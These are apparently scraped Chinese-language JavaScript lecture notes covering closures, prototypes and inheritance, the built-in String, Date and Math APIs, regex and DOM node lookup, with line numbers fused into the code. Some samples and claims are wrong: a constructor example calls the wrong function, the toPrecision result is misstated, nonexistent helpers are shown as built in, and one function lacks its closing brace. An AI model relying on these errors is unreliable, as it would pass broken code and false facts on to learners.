扫雷游戏也是先体验 在问是否退出 提高体验 比如：先买单 在吃饭 while 用户体验不高 一般情况下面，如果条件判断是数字的比较==&lt;&gt;，for循环优先. 如果是非数值相关的比较循环，while优先 2、代码内存解析 闭包 a.程序永远是先定义后执行 b.执行永远从上到下 c.函数定义的话在堆（只是一个地址而已） d.函数调用的时候，就会有自己的堆和栈（闭包） 闭包 作用域 记住：先定义var function 在从上往下执行 定义定义在自己的栈里面 执行在自己的堆里面 运行在运行的环境中 函数每调用前 只是一个地址 只要调用一次函数就会动态开辟一块内存 创建一个封闭的空间 在自己的封闭的空间的栈中定义var在执行 函数执行完 里面的东西全部销毁 12345678910111213//alert(x);//9:执行弹出x,结果x没定义,错误.alert(i);//9:执行弹出i,然而i之前已经定义,只不过没地址,因此是undefiendvar i = 10;//1:var i; 10:把常量池中10的地址赋给栈中的ivar j = \"你好\";//2:var j; 11:把常量池中 你好 的地址复给栈中的jvar k = z = null;//3:var k,z; 12:把堆中null的地址赋值给z和kvar m = function()&#123;//4:var m; 5:function匿名函数 13:把匿名函数在堆中的地址赋给栈中的m alert(2);&#125;var b = document.body;//6:var b; 14:把堆中document.body对象的地址赋给栈中的bvar f = true;//7:var f; 15:把常量池中true的地址赋给栈中的变量ffunction m()&#123;//8:function m; alert(1);&#125; 12345678910function m()&#123; c = 50;//在局部变量中找不到定义的c 沿着作用域链找到了全局变量的c alert('哈哈哈'); //var c;&#125;var c = 150; // 函数m()还未执行到 还没被销毁 此时全局c的值c=50m();var c = 20;//到这里一步 m()已经执行完了 函数已经销毁了 这里的c还是20alert(c);//20 1234567891011121314function m()&#123; c = 50;//在局部变量中找不到定义的c 沿着作用域链找到了全局变量的c alert('哈哈哈'); function inner()&#123; c = 30; alert('嘻嘻'); &#125; inner();//c在函数内部找不到定义 所以沿着作用域链找到了全局的c&#125;var c = 20;//到这里一步 m()还没执行 函数没被销毁 这里的c是30m();alert(c);//30 4、object对象 5、面向对象的程序设计 a.function构造器 b.prototype原型 c.foreach c.作用域 d.继承 一些内存图示 闭包示例1 闭包示例2 闭包1 闭包2 闭包3 原型链的几张图解 原型链图解 js原型链演示00-new Object js原型链演示01-函数Foo声明 js原型链演示-对象继承模式-01-浅拷贝 js原型链演示02-new Foo() js原型链演示02-1-new 原理 js原型链演示03-Foo.prototype js原型链演示-对象继承模式-03-基于对象的原型继承 js原型链演示05-继承函数示例 js原型链演示06-继承prototype模式 js原型链演示07-继承prototype模式改进 js原型链演示08-继承prototype直接继承 js原型链演示08-继承prototype空对象中介 js原型链演示09-继承prototype空对象中介封装expend js原型链演示10-构造器拷贝继承 扩展阅读 Javascript的原型链图详解 第七课时 上节回顾： 1.switch 2.while/do...while 一般情况下面，如果条件判断是数字的比较==&lt;&gt;，for循环优先. 如果是非数值相关的比较循环，while优先 3.function函数 4.代码内存解析 闭包 a.程序永远是先定义后执行 b.执行永远从上之下 c.函数定义的话在堆（只是一个地址而已） d.函数调用的时候，就会有自己的堆和栈（闭包） 知识点： 1、object对象 new关键字代表的是新开辟一块内存空间 没有被引用的内存空间，会在适当的时候被销毁 两句代码含义等同 var person = new Object(); var person = {}; 访问对象的属性除了用 对象引用.属性 key以外，还可以使用对象引用[属性key] new 原理详细解析 无论什么时候，只要创建一个新函数，就会根据一组特定的规则为该函数创建一个prototype属性，这个属性指向函数的原型对象。 在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性包含一个指向prototype属性所在函数的指针（就是指向新创建的函数）。 通过这个构造函数（原型对象的构造函数），可以继续为原型对象添加其他属性和方法。 当调用构造函数创建一个新实例后，该实例的内部将包含一个指针（内部属性），指向构造函数的原型对象。ECMA-262第5版管这个指针叫 [[Prototype]]。脚本中没有标准的方式访问[[Prototype]]，但Firefox、Safari和Chrome在每个对象上都支持一个属性__proto__；而在其他实现中，这个属性对脚本是完全不可见的。不过，要明确的真正重要的一点就是，这个连接存在于实例和构造函数的原型对象之间，而不是存在于实例和构造函数之间 new创建对象的步骤 创建一个新的对象 将构造函数的作用域赋给新对象 执行构造函数的代码，为这个新对象添加属性 返回新对象 12345678910111213141516171819202122232425function Person(name, age) &#123; this.name = name; this.age = age; this.say = function () &#123; console.log(this.name); &#125;;&#125;function createPerson(P) &#123; // 创建一个新对象 var o = new Object(); // 获取传递给Person函数的参数 var args = Array.prototype.slice.call(arguments, 1); // 新对象的__proto__属性指向Person的原型对象 o.__proto__ = P.prototype; // Person的原型对象的constructor指向Person P.prototype.constructor = P; // 把Person构造函数的作用域赋给新对象 // 给这个新对象添加属性（name,age,say） P.apply(o, args); // 返回这个新对象 return o;&#125;var p = createPerson(Person, 'wang', 35); 2、面向对象的程序设计 function构造器 共同点: 动态创建一块内存空间，闭包 不同点: 函数调用是没有办法拿到空间的地址的，而且这块地址是一块临时地址，执行完函数之后，就会销毁 new开辟内存空间，把这块空间的地址返回，这块空间就有可能长期的被引用 prototype原型 通过原型使通过同样一个构造器所new（创建）出来的对象具有相同的属性和行为 prototype本质就是一个对象 foreach this 指代当前创建的这块内存 this.name=name 指代当前内存中的这个name属性 接收外界传过来的值 继承 多种构造函数 传统的创建对象 12345678910111213141516var person = new Object();person.name = “lancer”;person.age = 24;person.job = “UI”;person.sayName = function()&#123;alert(this.name);&#125;person.sayName(); 工厂模式 123456789101112131415161718192021222324function createPerson(name,age,job)&#123;var o = new Object();o.name = name;o.age = age;o.job = job;o.sayName = function()&#123;alert(o.name);&#125;return o;&#125;var person1 = createPerson(“lancer”,24,”UI”);person1.sayName(); 构造函数 1234567891011121314151617181920function Person(name,age,job)&#123;this.name = name;this.age = age;this.job =job;this.sayName = function()&#123;alert(this.name)&#125;&#125;var person1 = createPerson(“lancer”,24,”UI”);person1.sayName(); 原型模式 1234567891011121314151617181920212223242526function Person()&#123;&#125;Person.prototype.name =”lancer”;Person.prototype.age =24;Person.prototype.job = “UI”;Person.prototype.sayName = function()&#123;alert(this.name)&#125;var person1 = new Person();person1.sayName();var person2 = new Person();person2.name =”lara”person2.sayName(); 简单原型模式 123456789101112131415161718192021222324function Person()&#123;&#125;Person.prototype = &#123;name : “lancer”,age : 24,job : “UI”,sayName : function()&#123;alert(this.name)&#125;&#125;;var person1 = new Person();person1.sayName(); 构造函数和原型模式 1234567891011121314151617181920212223242526function Person(name,age,job)&#123;this.name = name;this.age = age;this.job =job;&#125;Person.prototype = &#123;constructor :Person,sayName : function()&#123;alert(this.name)&#125;&#125;;var person1 = new Person(“lancer”,”24″,”UI”);person1.sayName(); 动态原型模式 123456789101112131415161718192021222324252627282930function Person(name,age,job)&#123;this.name = name;this.age = age;this.job =job;&#125;if(typeof this.sayName !=”function”)&#123;Person.prototype = &#123;constructor :Person,sayName : function()&#123;alert(this.name)&#125;&#125;;&#125;var person1 = new Person(“lancer”,”24″,”UI”);person1.sayName(); 稳妥构造函数 123456789101112131415161718var Person = function(name,age,job)&#123;var O = new Object();O.sayName = function()&#123;alert(name);&#125;;return O&#125;var person1 = Person(“lancer”,24,”UI”);person1.sayName(); 其他： 函数调用后一定有返回值，没有返回值就是undefined 一些内存图示 第八课时 上节回顾： 1.object对象 new关键字代表的是新开辟一块内存空间 没有被引用的内存空间，会在适当的时候被销毁 两句代码含义等同 var person = new Object(); var person = {}; 访问对象的属性除了用 对象引用属性key以外，还可以使用对象引用[属性key] 2.面向对象的程序设计 a.function构造器 共同点: 动态创建一块内存空间，闭包 不同点： 函数调用是没有办法拿到空间的地址的，而且这块地址是一块临时地址，执行完函数之后，就会销毁 new开辟内存空间，把这块空间的地址返回，这块空间就有可能长期的被引用 b.prototype原型 通过原型使通过同样一个构造器所new（创建）出来的对象具有相同的属性和行为 prototype本质就是一个对象 c.foreach c.this d.继承 知识点： 1.prototype内存解析 prototype是原型，是一块所有对应构造器创建的对象都共享的内存空间 在面向对象设计程序的时候，属性应该是对应的空间的，而功能应该是prototype公共空间的 2.通过prototype扩展功能 所有的构造器都是继承于Object构造器的，因此只要Object的原型里有的功能，所有的对象都有 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//多个对象的构造 以及 多个对象之间如何建立联系function Student(name,age,sex)&#123; this.name = name; this.age = age; this.sex = sex;&#125;function Bingqilin(name)&#123; this.name = name;&#125;function Game(name)&#123; this.name = name;&#125;function Hour(time)&#123; this.time = time;&#125;Student.prototype = &#123; eat:function(b)&#123; alert(this.name+\"喜欢吃\"+b.name); &#125;, mess:function()&#123; alert(this.name+\"的信息：\"+this.age+','+this.sex); &#125;, sleep:function(h)&#123; alert(this.name+\"每天睡,\"+h.time+'小时'); &#125;, work:function(h)&#123; alert(this.name+\"每天工作,\"+h.time+'小时'); &#125;, like:function(g)&#123; alert(this.name+\"喜欢打,\"+g.name); &#125;&#125;var s = new Student(\"小明\",22,\"男\");var b = new Bingqilin(\"黑色的冰淇淋\");s.eat(b);//小明喜欢吃黑色的冰淇淋var g = new Game(\"英雄联盟\");s.like(g);//把对象的地址发送给like的参数即可访问构造函数Game的name属性var h = new Hour(10);s.sleep(h);s.work(h); 一些内存图示 第九课时 回顾： 1、prototype内存解析 prototype是原型，是一块所有对应构造器创建的对象都共享的内存空间 在面向对象设计程序的时候，属性应该是对应的空间的，而功能应该是prototype公共空间的 2、通过prototype扩展功能 所有的构造器都是继承于Object构造器的，因此只要Object的原型里有的功能，所有的对象都有 构造器在定义的时候 就默认创建了一个空的原型 3、封装 1：找对象 小头爸爸 大头儿子 饭 2：抽象（类，构造器） 3：创建对象并且建立关系（操作对象） 面向对象例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237//小头爸爸牵着大头儿子的手去吃饭，吃完饭之后，//小头爸爸背着大头儿子回家，回家后儿子学习，老爸工作，工作学习完后//儿子看动画片//围裙妈妈带儿子睡觉//张三和张四//分析对象 小头爸爸 大头儿子 饭 以及功能//设计构造器（类）//创建对象以及他们之间的关联 function Person(name,age)&#123; this.name = name; this.age = age; &#125;function Rice(name)&#123; this.name = name;&#125;//Person.prototype.getHand = function()&#123;//这样子写也可以 但还是用默认生成的那块空的内存对象 往里面添加属性 方法 //不浪费内存//&#125;//在prototype中定义的每个对象都有这些功能Person.prototype = &#123;//这样子写 抛弃了默认生成的那块空的内存对象 重新创建了一块新的内存对象 记住：原型的本质是对象 //多个功能写在一起 getHand:function(person)&#123;//牵手 alert(this.name+\"在牵着\"+person.name+\"的手....\"); &#125;, eat:function(rice)&#123; alert(this.name+\"在吃\"+rice.name); &#125;, //需求 18岁以上才能背人 /* //写法一 不推荐 这个满足18岁的功能是自己强加的 不是客户需求的 carry:function(person)&#123;//这里设计不合理 让老爸有这个功能 儿子没有这个功能 if(this.age&gt;=18)&#123; alert(this.name+'背着'+person.name); &#125;else&#123; alert(this.name+\",还未满18岁，背不起\"); &#125; &#125;,*/ backhome:function()&#123; alert(this.name+\"回家\"); &#125;, study:function()&#123; alert(this.name+\"正在学习\"); &#125;, watchTV:function(jm)&#123; alert(this.name+\"正在看\"+jm+'...'); &#125;&#125;;var p1 = new Person(\"老爸\",20);var p2 = new Person(\"儿子\",15);//p1.getHand(p2);//p1.eat(new Rice(\"蛋炒饭\"));//p2.eat(new Rice(\"猪脚饭\"));//p1.carry(p2);//老爸背儿子//p2.carry(p1);//让儿子背老爸 输出结果：儿子,还未满18岁，背不起//p1.backhome();//写法二 不推荐 100对关系 代码写很多遍/*//让老爸单独有背的这个功能 儿子没有这个功能p1.carry = function(person)&#123; alert(this.name+'背着'+person.name);&#125;p1.carry(p2);*///-------通过继承解决这个 让老爸单独有背的这个功能 儿子没有这个功能 可以应对多功能 多需求//功能函数Object.prototype.extends = function(func,actions)&#123;//让所有的子孙 构造器都有这个功能 for(var prop in func.prototype)&#123;//传进一个func构造器 迭代构造器中的功能 把构造器中的功能全都映射过来 复制一份 this.prototype[prop] = func.prototype[prop];//迭代原型中的所有的功能到 当前里面去 &#125; for(var prop in actions)&#123; this.prototype[prop] = actions[prop]; &#125;&#125;;function Father(name)&#123; this.name = name;&#125;Father.extends(Person,&#123; carry:function(person)&#123; alert(this.name+'背着'+person.name); &#125;, work:function()&#123; alert(this.name+\"正在工作\"); &#125;&#125;);//扩展//设计程序有个原则：不修改只增加function Children(name)&#123; this.name = name;&#125;Children.extends(Person);function Mother(name)&#123; this.name = name;&#125;Mother.extends(Person,&#123; scoop:function(person)&#123; //判断必须是children的对象才能执行这个功能 //if()&#123; alert(this.name+\"唱着摇篮曲哄\"+person.name+\"睡觉\"); //&#125; &#125;&#125;);/*Father.prototype.carry= function(person)&#123;//创建这个原型的想法是：原来Person有的功能 我都需要有 并在这些基础上加一个功能 carry //如何建立Father基础Person的功能？写一个继承的小工具来操作 alert(this.name+'背着'+person.name);&#125;;Father.prototype.work = function()&#123; alert(this.name+\"正在工作\");&#125;*/var p1 = new Father(\"老爸\");var p2 = new Children(\"儿子\");p1.carry(p2);//只有老爸有carry这个功能//p2.carry(p1);//error 儿子没有carry这个功能p2.study();//儿子在学习p1.work();//老爸在工作p1.watchTV('看足球');p2.watchTV('蜡笔小新');var p3 = new Mother('围裙妈妈');p3.scoop(p2); 知识点： 1.继承 2.面向对象程序设计案例（猜拳） 一些内存图示 第十课时 上节回顾： 1.继承 本质就是从一个prototype对象中把它的功能都copy到另一个prototype对象 继承为什么要循环 2.call apply方法的使用 func.call（obj）：调用func的时候，以obj这个对象的作用域去调用 改变函数在调用的时候里面闭包的作用域 call(obj,arg1,arg2,arg3);call第一个参数传对象，可以是null。参数以逗号分开进行传值，参数可以是任何类型。apply(obj,[arg1,arg2,arg3]);apply第一个参数传对象，参数可以是数组或者arguments对象 知识点： API application program interface 第一：遇到问题 第二：查资料或者学习 -&gt; 解决问题 第三：记住有这个功能 第四：查资料（百度） 常用API 1.String 2.Array 3.Math Math.random(); 4.Date 日期型函数Date 声明 1234567891011var myDate = new Date(); //系统当前时间var myDate = new Date(yyyy, mm, dd, hh, mm, ss);var myDate = new Date(yyyy, mm, dd);var myDate = new Date(“monthName dd, yyyy hh:mm:ss”);var myDate = new Date(“monthName dd, yyyy”);var myDate = new Date(epochMilliseconds); 获取时间的某部份 123456789101112131415161718192021222324252627var myDate = new Date();myDate.getYear(); //获取当前年份(2位)myDate.getFullYear(); //获取完整的年份(4位,1970-????)myDate.getMonth(); //获取当前月份(0-11,0代表1月)myDate.getDate(); //获取当前日(1-31)myDate.getDay(); //获取当前星期X(0-6,0代表星期天)myDate.getTime(); //获取当前时间(从1970.1.1开始的毫秒数) 时间戳！！myDate.getHours(); //获取当前小时数(0-23)myDate.getMinutes(); //获取当前分钟数(0-59)myDate.getSeconds(); //获取当前秒数(0-59)myDate.getMilliseconds(); //获取当前毫秒数(0-999)myDate.toLocaleDateString(); //获取当前日期myDate.toLocaleTimeString(); //获取当前时间myDate.toLocaleString( ); //获取日期与时间 计算之前或未来的时间 123var myDate = new Date();myDate.setDate(myDate.getDate() + 10); //当前时间加10天//类似的方法都基本相同,以set开头,具体参考第2点 计算两个日期的偏移量 123var i = daysBetween(beginDate,endDate); //返回天数var i = beginDate.getTimezoneOffset(endDate); //返回分钟数 检查有效日期 123456//checkDate() 只允许”mm-dd-yyyy”或”mm/dd/yyyy”两种格式的日期if( checkDate(“2006-01-01”) )&#123; &#125;//正则表达式(自己写的检查 yyyy-mm-dd, yy-mm-dd, yyyy/mm/dd, yy/mm/dd 四种)var r = /^(\\d&#123;2&#125;|\\d&#123;4&#125;)[\\/-]\\d&#123;1,2&#125;[\\/-]\\d&#123;1,2&#125;$/;if( r.test( myString ) )&#123; &#125; 字符串String型函数API 声明 123var myString = new String(“Every good boy does fine.”);var myString = “Every good boy does fine.”; 字符串连接 123var myString = “Every ” + “good boy ” + “does fine.”;var myString = “Every “; myString += “good boy does fine.”; 截取字符串 1234567891011121314151617181920212223//截取第 6 位开始的字符var myString = “Every good boy does fine.”;var section = myString.substring(6); //结果: “good boy does fine.”//截取第 0 位开始至第 10 位为止的字符var myString = “Every good boy does fine.”;var section = myString.substring(0,10); //结果: “Every good”//截取从第 11 位到倒数第 6 位为止的字符var myString = “Every good boy does fine.”;var section = myString.slice(11,-6); //结果: “boy does”//从第 6 位开始截取长度为 4 的字符var myString = “Every good boy does fine.”;var section = myString.substr(6,4); //结果: “good” 转换大小写 12345var myString = “Hello”;var lcString = myString.toLowerCase(); //结果: “hello”var ucString = myString.toUpperCase(); //结果: “HELLO” 字符串比较 123456789var aString = “Hello!”;var bString = new String(“Hello!”);if( aString == “Hello!” )&#123; &#125; //结果: trueif( aString == bString )&#123; &#125; //结果: trueif( aString === bString )&#123; &#125; //结果: false (两个对象不同,尽管它们的值相同) 检索字符串 12345var myString = “hello everybody.”;// 如果检索不到会返回-1,检索到的话返回在该串中的起始位置if( myString.indexOf(“every”) &gt; -1 )&#123; &#125; //结果: true 查找替换字符串 123var myString = “I is your father.”;var result = myString.replace(“is”,”am”); //结果: “I am your father.” 特殊字符 \\b : 后退符 \\t : 水平制表符 \\n : 换行符 \\v : 垂直制表符 \\f : 分页符 \\r : 回车符 \\” : 双引号 \\’ : 单引号 \\\\ 反斜杆 将字符转换成Unicode编码 12345var myString = “hello”;var code = myString.charCodeAt(3); //返回”l”的Unicode编码(整型)var char = String.fromCharCode(66); //返回Unicode为66的字符 将字符串转换成URL编码 1234567var myString = “hello all”;var code = encodeURI(myString); //结果: “hello%20all”var str = decodeURI(code); //结果: “hello all”//相应的还有: encodeURIComponent() decodeURIComponent() 扩展阅读 JavaScript下常用的字符串 Math对象型 Math.abs(num) : 返回num的绝对值 Math.acos(num) : 返回num的反余弦值 Math.asin(num) : 返回num的反正弦值 Math.atan(num) : 返回num的反正切值 Math.atan2(y,x) : 返回y除以x的商的反正切值 Math.ceil(num) : 返回大于num的最小整数 Math.cos(num) : 返回num的余弦值 Math.exp(x) : 返回以自然数为底,x次幂的数 Math.floor(num) : 返回小于num的最大整数 Math.log(num) : 返回num的自然对数 Math.max(num1,num2) : 返回num1和num2中较大的一个 Math.min(num1,num2) : 返回num1和num2中较小的一个 Math.pow(x,y) : 返回x的y次方的值 Math.random() : 返回0到1之间的一个随机数 Math.round(num) : 返回num四舍五入后的值 Math.sin(num) : 返回num的正弦值 Math.sqrt(num) : 返回num的平方根 Math.tan(num) : 返回num的正切值 Math.E : 自然数(2.718281828459045) Math.LN2 : 2的自然对数(0.6931471805599453) Math.LN10 : 10的自然对数(2.302585092994046) Math.LOG2E : log 2 为底的自然数(1.4426950408889634) Math.LOG10E : log 10 为底的自然数(0.4342944819032518) Math.PI : π(3.141592653589793) Math.SQRT1_2 : 1/2的平方根(0.7071067811865476) Math.SQRT2 : 2的平方根(1.4142135623730951) Number型 常用的数字函数 声明 123var i = 1;var i = new Number(1); 字符串与数字间的转换 1234567891011var i = 1;var str = i.toString(); //结果: “1”var str = new String(i); //结果: “1”i = parseInt(str); //结果: 1i = parseFloat(str); //结果: 1.0//注意: parseInt,parseFloat会把一个类似于”32G”的字符串,强制转换成32 判断是否为有效的数字 1234567891011var i = 123; var str = “string”;if( typeof i == “number” )&#123; &#125; //true//某些方法(如:parseInt,parseFloat)会返回一个特殊的值NaN(Not a Number)//请注意第2点中的[注意],此方法不完全适合判断一个字符串是否是数字型!!i = parseInt(str);if( isNaN(i) )&#123; &#125; 数字型比较 1234567891011//此知识与[字符串比较]相同- **小数转整数**var f = 1.5;var i = Math.round(f); //结果:2 (四舍五入)var i = Math.ceil(f); //结果:2 (返回大于f的最小整数)var i = Math.floor(f); //结果:1 (返回小于f的最大整数) 格式化显示数字 123456789var i = 3.14159;//格式化为两位小数的浮点数var str = i.toFixed(2); //结果: “3.14”//格式化为五位数字的浮点数(从左到右五位数字,不够补零)var str = i.toPrecision(5); //结果: “3.1415” X进制数字的转换 123456var i = parseInt(“0x1f”,16);var i = parseInt(i,10);var i = parseInt(“11010011”,2); 随机数 1234567//返回0-1之间的任意小数var rnd = Math.random();//返回0-n之间的任意整数(不包括n)var rnd = Math.floor(Math.random() * n) 5.Regex 1234567891011121314151617181920212223242526272829//在这个最大的对象的原型上加一个extends方法 使得下面所有的原型 都有这个方法 //这个原型的作用是通过迭代 复制传进来的构造器的所有的原型的方法 Object.prototype.extends = function(parent)&#123; //console.log(parent.prototype); for(var prop in parent.prototype)&#123; //console.log(prop);//eat extends this.prototype[prop] = parent.prototype[prop];//复制传进来的构造器的所有的原型的方法给当前正在调用这个方法的对象 &#125; &#125; function Person(name)&#123; this.name = name; &#125; Person.prototype = &#123; eat:function()&#123; alert(this.name+\"在吃饭\"); &#125; &#125;; function Father(name)&#123; this.name = name; &#125; Father.extends(Person);//extends方法是最大的对象Object加的方法 所有的子孙 构造器都有这个方法 var f = new Father(\"小头爸爸\"); f.eat(); 一些图示 正则表达式扩展阅读 正则表达式30分钟入门教程 梳理常用的正则表达式 第十一课时 上节回顾： 1.String 2.Math Math.random() 知识点： 1.Date 日期类 2.Array 3.Regex a.[]一个字符的范围 b.有顺序要求的 c.\\w==[a-zA-Z0-9_] \\d==[0-9] d.{count}设置匹配数量比如\\w{5} e.//的正则表达式匹配局部，/^$/的正则表达式是匹配全部 f.()的作用就是为了分组匹配 简单封装一个对象案例 123456789101112131415String.prototype.isEmail = function()&#123; email = this; if (email.indexOf(\"@\")!=-1&amp;&amp;email.indexOf(\".\")!=-1) &#123; if(email.indexOf(\"@\")&lt;email.lastIndexOf(\"@\"))&#123; alert(\"邮箱不合法\"); &#125;else&#123; alert(\"邮箱合法\"); &#125; &#125;&#125;var email = \"jingguanliuye@gmail.com\";email.isEmail(); 12345678910111213141516171819202122232425262728//===============================日历练习(方法简洁 高效)======================================//var year = parseInt(prompt(\"请输入日历年份：\"));//var month = parseInt(prompt(\"请输入日历月份：\"))-1;Date.prototype.printCalendar = function()&#123;var year = this.getFullYear(),month = this.getMonth();var date = new Date(year,month,1);//alert(date.toLocaleString());document.write(\"&lt;div class='date'&gt;\"+year+\"年\"+(month+1)+\"月&lt;/div&gt;\");document.write(\"日 一 二 三 四 五 六&lt;br /&gt;\");var day = date.getDay();for(var i=0;i&lt;day;i++)&#123; document.write(' ');&#125;var count = new Date(year,month+1,0).getDate();//这里的0返回一个月的最后一天for(var i=1;i&lt;=count;i++)&#123; document.write(i+' '); if((i+day)%7==0)&#123; document.write('&lt;br/&gt;'); &#125;&#125;&#125;new Date(2012,2).printCalendar(); 第十二课时 上节回顾： 1.Date 期类 2.Array 3.Regex a.[]一个字符的范围 b.有顺序要求的 c.\\w==[a-zA-Z0-9_] \\d==[0-9] d.{count}设置匹配数量比如\\w{5}，{c1,c2} e.//的正则表达式匹配局部，/^$/的正则表达式是匹配全部 f.()的作用就是为了分组匹配 新知识点： 1.Regex g.+代表的是1-N个，*代表的是0-N个 h.?代表该字符要不没有要不就有一个 i..代表的是任意字符 j. \\转义符 2.BOM 第十三课时 上节回顾： 1.Regex a.[]一个字符的范围 b.有顺序要求的 c.\\w==[a-zA-Z0-9_] \\d==[0-9] d.{count}设置匹配数量比如\\w{5}，{c1,c2} e.//的正则表达式匹配局部，/^$/的正则表达式是匹配全部 f.()的作用就是为了分组匹配 g.+代表的是1-N个，*代表的是0-N个 h.?代表该字符要不没有要不就有一个 i..代表的是任意字符 j.\\转义符 新知识： window 是Window构造器造出来的一个对象 alert(window instanceof Window) document 是Document构造器造出来的一个对象 任何对象在我们的内存中他都是由某个构造器创建出来的 也就是说 有构造器一定有对应的原型prototype 例如：div是由HTMLDivElement 这个构造器创建的一个实例 div = new HTMLDivElement() span = new HTMLSpanElement() 查看某个对象对应的构造器：console.log(); 整个浏览器的实现就是一个面向对象的编程思想 一切皆是对象 1.BOM 浏览器对象模型 BOM a.screen 指的不是浏览器的宽度，指的是整个电脑屏幕的分辨率 可以拿到屏幕可用分辨率 b.navigator 可以通过userAgent判断当前浏览器信息 c.location URL：统一资源定位符 Union Resource Location 可以通过href属性重定向（改变）页面的URL，进行页面跳转 d.history go方法能够让我们进行历史回退或者前进 e.frames 获得当前窗体的子页面（iframe） f.document DOM模型的核心对象 2.DOM 文档对象模型 document 功能 getElementById $(&#39;#aaa&#39;) getElementByTagName $(&#39;div&#39;) getElementsByClassName $(&#39;.aaa&#39;) getElementsByName 只用在表单元素中 document object 属性： className，style id name,value(表单元素) href,src…(对应的元素) innerHTML children parentNode 功能方法： setAttribute/getAttribute appendChild 第十四课时 上节回顾： 1.BOM 浏览器对象模型 a.screen 指的不是浏览器的宽度，指的是整个电脑屏幕的分辨率 可以拿到屏幕可用分辨率 b.navigator 可以通过userAgent判断当前浏览器信息 c.location URL：统一资源定位符 Union Resource Location 可以通过href属性重定向（改变）页面的URL，进行页面跳转 d.history go方法能够让我们进行历史回退或者前进 e.frames获得当前窗体的子页面（`iframe`） f.document DOM模型的核心对象 所有的DOM对象都是在堆内存创建的 都是有一个构造器生成的 查看对象的构造器器方法： step1：查看标签的对象以及构造器var body = document.body;console.log(body.toString()) step2：查看对象是否是这个构造器创建出来的 console.log(body instanceof HTMLBodyElement) 新知识点： 1.DOM 文档对象模型 document 功能 getElementById：通过传入的ID，返回标识了这个ID的唯一对象的内存地址 getElementsByTagName:通过传入的标签名字，返回所有该标签对象（HTMLCollection） getElementsByClassName:通过类的名字，返回所有该类的元素对象（HTMLCollection） createElement:想要创建出来的元素能够绘制在页面中，那么它必须在DOM树中 总结 document对象是DOM原型的核心对象，它是内存DOM树的根，所以它提供了很多功能让我们快速的找到DOM树中的某些DOM节点（对象） element 功能方法：（自定义属性非常灵活好用） setAttribute/getAttribute //getAttribute获取标签的属性 –用来操作标签的属性 setAttribute设置标签的属性 appendChild:添加子元素 属性： id className，style name,value(只有表单元素有 其他是没有的) href,src…(对应的元素) innerHTML/innerText innerText返回文本信息 children://子元素集合 parentNode//父元素 总结：元素的功能属性直接可以通过元素对象点出来，除此意外的自定义属性，请通过get/setAtribute去操作 DOM 操作： 图片切换的相册效果 tab切换效果 表单验证 特效就是DOM操作的具体应用 DOM操作就是用js来写HTML代码 节点/元素/标签： 三种常用的节点类型： 元素节点 属性节点 文本节点 操作DOM对象： 修改：–找到这个节点 删除：–找到这个节点 添加：–先造出一个节点 然后插入 插入到哪里？找节点来定位 这些都离不开节点的查找 节点的查找：（最重要） 1、document.getElementById—根据id查找节点 [返回的是节点本身] 2、document.getElementsByTagName–根据标签名字来查找[返回的是数组]document.getElementsByTagName[i] 3、document.getElemenstByName–根据name属性来查找节点（一般用在表单中）[返回的是数组]document.getElemenstByName[i] 注意：早期浏览器都认为name只出现在表单中 因此document.getElemenstByName只对表单中的元素发挥作用 后来部分浏览器把Name属性扩展到一般的元素 如：div 但是IE浏览器还是只能对表单使用byName因此处于兼容性 我们只能对表单使用byName DOM中查找节点的思路：（由大到小 个别情况 由子到父） 由大到小：（通过下面的来定位） 1、document.getElementById—根据id查找节点 [返回的是节点本身] 2、document.getElementsByTagName–根据标签名字来查找[返回的是数组]document.getElementsByTagName[i] 3、document.getElemenstByName–根据name属性来查找节点（一般用在表单中）[返回的是数组]document.getElemenstByName[i] 如果还没有查到自己想要的节点，还可以继续根据上面已经找到的节点再次定位来查找 怎么继续定位？ 答：childNodes/child 继续查找： 1、查找子元素 children[index]/childNodes 2、查找父元素 node.parentNode –&gt;获取父元素 3、查找兄弟元素 nextSibling previousSibling 4、nextSibling previousSibling firstChild lastChild这四个属性容易受到空白文本的影响 建议不用 12345678910111213141516//============给Object原型加一个方法 消除文本节点对DOM操作的影响 例如：nextSibling` `previousSibling` `firstChild` `lastChild （受到换行 和文本节点影响）Object.prototype.next = function()&#123; //NodeType == 3 text的代号 //NodeType == 1 tag的代号 if(this.nextSibling)&#123;//判断下一个兄弟节点是否存在 switch(this.nextSibling.nodeType)&#123; case 1: return this.nextSibling; case 3: return this.nextSibling.nextSibling; &#125;&#125;else&#123; return null;&#125;console.log(div1.next().next().innerText); 5、对于查到的某个元素里面的子元素非常多 这时候还可利用getElementsByTagname进一步筛选 注意 对于元素对象和document对象相比 元素对象只能利用getElementsByTagName函数 其他两个不能用 节点查找也是通过由大到小来定位：找到大的元素进一步细化 完全可以找到页面上任意一个元素控制他 子元素 不好找 就找他的父元素 要过滤空白文本节点，用children取他的文本节点 DOM与节点的关系： node: childNodes[] parentNode firstChild getElementsByTagName(&#39;元素标签&#39;) lastchild nextSibling previousSibling children[index] children 不是w3c标准 但是各大浏览器兼容性很好 通过给原型添加方法在元素后面创建标签 启示：在项目中，很多很多地方都需要一个方法但是系统没提供，这时可以通过原型扩展 123456789101112//var p = document.createElement('p');//p.innerHTML = \"this is a p\";//var child = document.getElementsByTagName('div');//给Div的HTMLDivElement构造器原型加一个创建元素的方法 要所有的元素都有这个方法 改成 ObjectHTMLDivElement.prototype.createElement = function(tagName)&#123; var child = document.createElement(tagName); this.appendChild(child); return child;&#125;var child = document.getElementsByTagName('div')[2].createElement(\"p\");child.innerHTML = 'pppppp'; DOM属性小结 Attributes 存储节点的属性列表(只读) childNodes 存储节点的子节点列表(只读) dataType 返回此节点的数据类型 Definition 以DTD或XML模式给出的节点的定义(只读) Doctype 指定文档类型节点(只读) documentElement 返回文档的根元素(可读写) firstChild 返回当前节点的第一个子节点(只读) Implementation 返回XMLDOMImplementation对象 lastChild 返回当前节点最后一个子节点(只读) nextSibling 返回当前节点的下一个兄弟节点(只读) nodeName 返回节点的名字(只读) nodeType 返回节点的类型(只读) nodeTypedValue存储节点值(可读写) nodeValue 返回节点的文本(可读写) ownerDocument 返回包含此节点的根文档(只读) 